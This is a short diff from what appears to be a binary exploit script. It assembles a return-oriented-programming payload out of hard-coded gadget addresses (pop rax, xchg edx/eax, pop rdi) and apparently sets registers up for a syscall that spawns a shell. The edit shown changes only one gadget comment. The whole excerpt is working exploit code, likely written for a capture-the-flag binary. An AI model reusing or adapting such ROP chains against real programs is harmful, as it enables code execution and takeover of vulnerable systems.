@@ -9,7 +9,7 @@ payload += p64(0x68662f)+p64(0x4870b1)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0
 payload += p64(0x41f0cb)
 # 0x000000000041f0cb: pop rax; ret; 
 payload += p64(0x0)+p64(0x44ee7c)
-# 0x000000000044ee7c: xchg eax, edx; ret 6; 
+# 0x000000000044ee7c: xchg edx, eax; ret 6; 
 payload += p64(0x4017d3)+"\x00"*6
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x487070)+p64(0x41f0cb)
